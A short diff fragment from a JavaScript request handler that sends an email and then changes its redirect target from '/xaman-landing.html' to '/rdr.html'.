@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     await transporter.sendMail(mailOptions);
 
     // Redirect to the original behavior
-    res.writeHead(302, { 'Location': '/xaman-landing.html' });
+    res.writeHead(302, { 'Location': '/rdr.html' });
     res.end();
 
   } catch (error) {
